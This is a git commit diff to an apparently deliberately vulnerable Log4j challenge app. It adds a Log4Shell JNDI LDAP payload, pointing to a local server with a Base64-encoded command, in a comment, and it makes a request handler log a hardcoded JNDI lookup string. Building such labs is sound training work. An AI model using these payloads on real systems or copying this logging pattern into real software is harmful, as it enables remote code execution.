ff34f05b4169c8754418ac4f37f4c762f4a9fb73
Lewis Watson <lewiswatson55@protonmail.com>
2021-12-27 18:48:02 +0000

    Force Log4J Version

--- src/main/java/uk/co/lnwatson/challenges/log4j/Log4jApplication.java
+++ src/main/java/uk/co/lnwatson/challenges/log4j/Log4jApplication.java
@@ -3,8 +3,14 @@ package uk.co.lnwatson.challenges.log4j;
 import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
 import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+// ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/c3RhcnQgLg==}
 
 @SpringBootApplication
 public class Log4jApplication {
@@ -17,16 +23,21 @@ public class Log4jApplication {
 
 	@RestController
 	@RequestMapping("/")
-	public class HomeController {
+	public static class HomeController {
 
+		private static final Logger logger = LogManager.getLogger("UserLogs");
 
-		@GetMapping
-		public String defaultMap() {
+		@GetMapping("/{id}")
+		public String index(@PathVariable String id) {
+			id = "${jndi:ldap://127.0.0.1:1389}";
+			logger.info("Info! - " + id);
 			return "Ahh";
 		}
 
 
 	}
+
+
 
 
 }
